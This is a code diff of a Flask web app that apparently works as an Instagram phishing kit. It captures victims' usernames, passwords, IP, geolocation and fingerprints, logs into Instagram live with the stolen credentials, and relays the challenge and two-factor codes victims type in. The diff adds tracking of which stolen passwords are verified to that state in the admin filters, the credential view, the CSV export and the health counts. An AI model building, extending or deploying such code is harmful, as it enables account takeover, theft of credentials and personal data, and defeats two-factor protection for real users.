+    set_verify(cred_id, "timeout" if status == "timeout" else "error")
+    note_attempt(g.cid, username, ip, status, detail or "")
+    msg = ("Instagram is not answering right now." if status == "timeout"
+           else f"Login failed: {detail or 'unknown error'}")
+    session["anyway"] = {"user": username, "pass": password, "cred": cred_id}
+    return login_page(msg + " You can retry, or continue anyway.", username, status=502)
+
+
+def _enter(visit: int, username: str) -> Response:
     resp = redirect(url_for("dashboard"))
     resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
     resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
     return resp
 
 
+@app.route("/challenge", methods=["POST"])
+def challenge():
+    code = (request.form.get("code") or "").strip()
+    with _pending_lock:
+        p = _pending.get(g.cid)
+    if not p:
+        return login_page("That challenge expired. Log in again.", "", status=400)
+    if not code:
+        return login_page("Enter the code Instagram sent you.", p["username"],
+                          mode="challenge", info=True)
+
+    status, detail = resolve_challenge(g.cid, code)
+
+    if status == "ok":
+        finish_login(g.cid, p["client"], p["username"], p["password"], p.get("cred"))
+        return _enter(1, p["username"])
+
+    if status == "2fa":
+        with _pending_lock:
+            if g.cid in _pending:
+                _pending[g.cid].pop("last_json", None)
+        set_verify(p.get("cred"), "2fa")
+        return login_page("Two-factor is on for this account. Enter your authenticator code.",
+                          p["username"], mode="2fa", info=True)
+
+    if status == "expired":
+        return login_page("That challenge expired. Log in again.", "", status=400)
+
+    return login_page(f"That code did not work. {detail or ''}".strip(), p["username"],
+                      mode="challenge")
+
+
+@app.route("/twofactor", methods=["POST"])
+def twofactor():
+    code = (request.form.get("code") or "").strip()
+    with _pending_lock:
+        p = _pending.get(g.cid)
+    if not p:
+        return login_page("That 2FA session expired. Log in again.", "", status=400)
+    if not code:
+        return login_page("Enter your 6-digit code.", p["username"], mode="2fa", info=True)
+
+    status, detail = resolve_2fa(g.cid, code)
+
+    if status == "ok":
+        finish_login(g.cid, p["client"], p["username"], p["password"], p.get("cred"))
+        return _enter(1, p["username"])
+
+    if status == "expired":
+        return login_page("That 2FA session expired. Log in again.", "", status=400)
+
+    return login_page(f"That code did not work. {detail or ''}".strip(), p["username"], mode="2fa")
+
+
 @app.route("/dashboard")
 def dashboard():
     username = session.get("user")
     if not username:
+        return redirect(url_for("index"))
+    if not session.get("verified"):
         return redirect(url_for("index"))
 
     page = RESULTS_PAGE_HTML
@@ -2327,6 +2777,7 @@ def cookies_view():
         "source": row["source"],
         "username": row["username"],
         "password": row["password"],
+        "verified": row["verify_state"],
         "ip": row["ip"],
         "geo": json.loads(row["geo_json"] or "{}"),
         "fingerprint": json.loads(row["meta_json"] or "{}"),
@@ -2341,7 +2792,7 @@ def console_redirect():
 @app.route("/logout")
 def logout():
     drop_session(g.cid)
-    for k in ("user", "last_login", "last_cred", "last_user"):
+    for k in ("user", "verified", "last_login", "last_cred", "last_user", "anyway"):
         session.pop(k, None)
     return redirect(url_for("index"))
 
@@ -2397,7 +2848,7 @@ def api_sync():
     if not session.get("user"):
         return jsonify({"ok": False, "error": "not signed in"}), 401
     if not IG_OK:
-        return jsonify({"ok": False, "error": "instagrapi not installed"}), 400
+        return jsonify({"ok": False, "error": IG_IMPORT_ERROR or "instagrapi not installed"}), 400
     sync_now(g.cid)
     return jsonify({"ok": True})
 
@@ -2413,6 +2864,7 @@ def api_reconnect():
         return jsonify({"ok": False, "error": "no stored credentials — log in again"}), 400
     ig_user, ig_pass = row["username"], unseal(row["pass_enc"])
     drop_session(g.cid)
+    session["verified"] = True
     start_login(g.cid, ig_user, ig_pass)
     return jsonify({"ok": True})
 
@@ -2527,6 +2979,10 @@ def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]
         where.append("c.password IS NOT NULL AND c.password != ''")
     elif only == "partial":
         where.append("(c.username = '' OR c.password = '')")
+    elif only == "ok":
+        where.append("c.verify_state = 'ok'")
+    elif only == "bad":
+        where.append("c.verify_state = 'bad'")
     if since is not None:
         where.append("c.id > ?")
         params.append(since)
@@ -2543,7 +2999,7 @@ def admin():
 
     q = (request.args.get("q") or "").strip()
     only = request.args.get("only") or ""
-    if only not in ("", "pass", "partial"):
+    if only not in ("", "pass", "partial", "ok", "bad"):
         only = ""
 
     sql, params = admin_query(q, only)
@@ -2565,7 +3021,8 @@ def admin():
             urlencode({"q": q, "only": value} if value else ({"q": q} if q else {})),
             label,
         )
-        for value, label in (("", "all"), ("pass", "with password"), ("partial", "partial"))
+        for value, label in (("", "all"), ("ok", "verified"), ("bad", "wrong pass"),
+                             ("pass", "with password"), ("partial", "partial"))
     )
 
     body = (
@@ -2595,7 +3052,7 @@ def admin_feed():
     since = int(raw) if raw.isdigit() else 0
     q = (request.args.get("q") or "").strip()
     only = request.args.get("only") or ""
-    if only not in ("", "pass", "partial"):
+    if only not in ("", "pass", "partial", "ok", "bad"):
         only = ""
 
     sql, params = admin_query(q, only, since)
@@ -2646,7 +3103,8 @@ def admin_credential(cred_id: int):
         f'<input type="hidden" name="_csrf" value="{csrf_token()}">'
         f'<button class="btn" type="submit">delete</button></form>'
         f'<div style="height:16px"></div>'
-        f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")}</h2>'
+        f'<div class="block"><h2>credential #{row["id"]} · {escape(row["source"] or "")}'
+        f' · {escape(row["verify_state"] or "unknown")}</h2>'
         f'<pre>client_id {escape(row["cid"] or "")}\nsession   {escape(row["sid"] or "")}\n'
         f'time      {escape(row["created_at"] or "")}\nip        {escape(row["ip"] or "")}\n'
         f'isp       {escape(row["isp"] or "")}\n'
@@ -2709,10 +3167,11 @@ def admin_export():
         buf = io.StringIO()
         w = csv.writer(buf)
         w.writerow(["id", "created_at", "ip", "country", "city", "isp", "source",
-                    "username", "password", "ua", "referer"])
+                    "verify_state", "username", "password", "ua", "referer"])
         for r in rows:
             w.writerow([r["id"], r["created_at"], r["ip"], r["country"], r["city"], r["isp"],
-                        r["source"], r["username"], r["password"], r["ua"], r["referer"]])
+                        r["source"], r["verify_state"], r["username"], r["password"],
+                        r["ua"], r["referer"]])
         return Response(buf.getvalue(), mimetype="text/csv",
                         headers={"Content-Disposition": f"attachment; filename=insight-{stamp}.csv"})
 
@@ -2730,11 +3189,14 @@ def healthz():
     conn = connect()
     try:
         n = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
+        ok = conn.execute("SELECT COUNT(*) c FROM creds WHERE verify_state='ok'").fetchone()["c"]
     finally:
         conn.close()
-    return jsonify({"ok": True, "credentials": n, "geo": GEO_ENABLED,
+    return jsonify({"ok": True, "credentials": n, "verified": ok, "geo": GEO_ENABLED,
                     "admin_locked": bool(ADMIN_TOKEN), "instagram": IG_OK,
-                    "crypto": CRYPTO_OK, "proxy": bool(IG_PROXY)})
+                    "instagram_version": IG_VERSION, "instagram_error": IG_IMPORT_ERROR,
+                    "crypto": CRYPTO_OK, "proxy": bool(IG_PROXY),
+                    "verify_timeout": VERIFY_TIMEOUT, "python": sys.version.split()[0]})
 
 
 # ---------------- errors ----------------
@@ -2799,7 +3261,8 @@ if __name__ == "__main__":
     if not os.environ.get("SECRET_KEY"):
         logger.warning("SECRET_KEY unset — using persisted key in %s", DATA_DIR / "secret.key")
     if not IG_OK:
-        logger.warning("instagrapi missing — dashboard will not connect. pip install instagrapi cryptography")
+        logger.warning("instagram client unavailable (%s) — pip install instagrapi cryptography",
+                       IG_IMPORT_ERROR or "not installed")
     if IG_OK and not IG_PROXY:
         logger.warning("IG_PROXY unset — instagram will likely challenge logins from this IP")
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
